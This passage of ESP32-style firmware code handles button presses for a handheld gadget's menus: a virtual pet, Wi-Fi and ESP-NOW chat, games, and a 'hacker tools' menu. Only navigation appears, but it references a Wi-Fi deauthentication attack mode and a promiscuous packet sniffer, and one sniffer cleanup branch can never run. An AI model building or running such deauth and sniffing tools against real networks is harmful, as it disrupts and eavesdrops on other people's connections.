          if (fileListCount > 0) {
             String selected = fileList[fileListSelection];
             if (selected.endsWith(".txt") || selected.endsWith(".log")) {
                showStatus("Opening...\n" + selected, 500);
                // In a real app we would read file content here
             } else {
                showStatus("Selected:\n" + selected, 1000);
             }
          }
          break;
        case STATE_VPET:
          if (petMenuSelection == 0) { // Feed
             myPet.hunger = min(myPet.hunger + 20.0f, 100.0f);
             showStatus("Yum!", 500);
          } else if (petMenuSelection == 1) { // Play
             if (myPet.energy > 10) {
               myPet.happiness = min(myPet.happiness + 15.0f, 100.0f);
               myPet.energy -= 10.0f;
               showStatus("Fun!", 500);
             } else {
               showStatus("Too tired!", 500);
             }
          } else if (petMenuSelection == 2) { // Sleep
             myPet.isSleeping = !myPet.isSleeping;
          } else if (petMenuSelection == 3) { // Back
             changeState(STATE_MAIN_MENU);
          }
          savePetData();
          break;
        case STATE_WIFI_MENU:
          handleWiFiMenuSelect();
          break;
        case STATE_ESPNOW_MENU:
          handleESPNowMenuSelect();
          break;
        case STATE_WIFI_SCAN:
          if (networkCount > 0) {
            selectedSSID = networks[selectedNetwork].ssid;
            if (networks[selectedNetwork].encrypted) {
              passwordInput = "";
              keyboardContext = CONTEXT_WIFI_PASSWORD;
              cursorX = 0;
              cursorY = 0;
              changeState(STATE_PASSWORD_INPUT);
            } else {
              connectToWiFi(selectedSSID, "");
            }
          }
          break;
        case STATE_ESPNOW_PEER_SCAN:
          if (espnowPeerCount > 0) {
            espnowBroadcastMode = false;
            showStatus("Direct mode\nto peer", 1000);
            changeState(STATE_ESPNOW_CHAT);
          }
          break;
        case STATE_ESPNOW_CHAT:
          userInput = "";
          keyboardContext = CONTEXT_ESPNOW_CHAT;
          cursorX = 0;
          cursorY = 0;
          currentKeyboardMode = MODE_LOWER;
          changeState(STATE_KEYBOARD);
          break;
        case STATE_KEYBOARD:
          handleKeyPress();
          break;
        case STATE_PASSWORD_INPUT:
          handlePasswordKeyPress();
          break;
        case STATE_SYSTEM_PERF:
          clearChatHistory();
          break;
        case STATE_TOOL_COURIER:
          checkResiReal();
          break;
        default: break;
      }
      buttonPressed = true;
    }
    
    if (digitalRead(BTN_LEFT) == BTN_ACT && digitalRead(BTN_RIGHT) == BTN_ACT) {
      if (currentState == STATE_PIN_LOCK) {
        // Do nothing to prevent bypassing PIN
      } else {
        switch(currentState) {
          case STATE_TOOL_DEAUTH_ATTACK:
            deauthAttackActive = false;
          // Restore normal wifi state
          WiFi.disconnect();
          WiFi.mode(WIFI_STA);
          changeState(STATE_HACKER_TOOLS_MENU);
          break;
        case STATE_TOOL_DEAUTH_SELECT:
          changeState(STATE_HACKER_TOOLS_MENU);
          break;
        case STATE_PASSWORD_INPUT:
          changeState(STATE_WIFI_SCAN);
          break;
        case STATE_WIFI_SCAN:
          changeState(STATE_WIFI_MENU);
          break;
        case STATE_WIFI_MENU:
        case STATE_SYSTEM_PERF:
        case STATE_TOOL_COURIER:
        case STATE_HACKER_TOOLS_MENU:
        case STATE_TOOL_SNIFFER:
        case STATE_TOOL_NETSCAN:
        case STATE_TOOL_FILE_MANAGER:
        case STATE_GAME_HUB:
          changeState(STATE_MAIN_MENU);
          break;
        case STATE_GAME_RACING:
        case STATE_VIS_STARFIELD:
        case STATE_VIS_LIFE:
        case STATE_VIS_FIRE:
          changeState(STATE_GAME_HUB);
          break;
        case STATE_ABOUT:
        case STATE_TOOL_WIFI_SONAR:
          // Cleanup
          if (currentState == STATE_TOOL_SNIFFER) {
             esp_wifi_set_promiscuous(false);
             snifferActive = false;
             WiFi.mode(WIFI_STA);
             WiFi.disconnect();
          }
          changeState(STATE_MAIN_MENU);
          break;
        case STATE_ESPNOW_MENU:
        case STATE_ESPNOW_PEER_SCAN:
          changeState(STATE_MAIN_MENU);
          break;
        case STATE_ESPNOW_CHAT:
          changeState(STATE_ESPNOW_MENU);
          break;
        case STATE_CHAT_RESPONSE:
          changeState(STATE_KEYBOARD);
          break;
        case STATE_KEYBOARD:
          if (keyboardContext == CONTEXT_CHAT) {
            changeState(STATE_MAIN_MENU);
          } else if (keyboardContext == CONTEXT_ESPNOW_CHAT) {
            changeState(STATE_ESPNOW_CHAT);
          } else if (keyboardContext == CONTEXT_ESPNOW_NICKNAME) {
            changeState(STATE_ESPNOW_MENU);
          } else {
            changeState(STATE_WIFI_SCAN);
          }
          break;
        default:
          changeState(STATE_MAIN_MENU);
          break;
      }
      buttonPressed = true;
      Serial.println("BACK pressed (L+R)");
    }
   }
    
    if (buttonPressed) {
      lastDebounce = currentMillis;
      lastInputTime = currentMillis;
      ledQuickFlash();
    }
  }
}
